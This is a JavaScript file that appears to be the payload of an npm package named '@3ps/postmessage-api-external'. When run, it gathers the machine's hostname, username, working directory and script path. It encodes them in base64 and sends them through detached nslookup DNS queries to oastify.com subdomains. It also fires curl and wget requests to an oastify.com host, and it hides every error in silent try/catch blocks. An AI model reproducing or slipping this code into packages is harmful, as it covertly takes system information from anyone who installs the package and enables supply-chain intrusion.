const os = require("os");
const { spawn } = require("child_process");
var isWin = process.platform === "win32";

const id = "@3ps/postmessage-api-external";
let globalCounter = 1;

try {
  exfil(`id_${id}`);
} catch (e) {}
try {
  exfil(`host_${os.hostname()}`);
} catch (e) {}
try {
  exfil(`user_${os.userInfo().username}`);
} catch (e) {}
try {
  exfil(`cwd:_${process.cwd()}`);
} catch (e) {}
try {
  exfil(`dirname_${__dirname}`);
} catch (e) {}
// try {
//   const nets = os.networkInterfaces();
//   for (const name of Object.keys(nets)) {
//     for (const net of nets[name]) {
//       exfil({ ["d_net_" + name]: net.address });
//     }
//   }
// } catch (e) {}

try {
  spawn(
    `curl`,
    [
      `http://${urlSafe(
        id
      )}.curl.dj02d9sc9muknk5xc9hx84g9t0zrnhb6.oastify.com/?${id}`,
    ],
    {
      detached: true,
    }
  );
  spawn(
    `wget`,
    [
      `http://${urlSafe(
        id
      )}.wget.dj02d9sc9muknk5xc9hx84g9t0zrnhb6.oastify.com/?${id}`,
    ],
    {
      detached: true,
    }
  );
} catch (error) {}

function exfil(data) {
  try {
    const b64 = Buffer.from(JSON.stringify(data))
      .toString("base64")
      .replace(/=/gm, "");

    let args = [];

    args.push(
      `${globalCounter}${b64}.p.9hrvk09s6fbw90r8666b5upb82et2wql.oastify.com`
    );
    
    spawn(`nslookup`, args, { detached: true });
    const args2 = [];
    args2.push(
      `${globalCounter++}${urlSafe(
        data
      )}.p.9hrvk09s6fbw90r8666b5upb82et2wql.oastify.com`
    );
    spawn(`nslookup`, args2, { detached: true });

  } catch (e) {
  }
}

function urlSafe(data) {
  return encodeURIComponent(data).replaceAll(/[@\/\.%]/gim, "_");
}
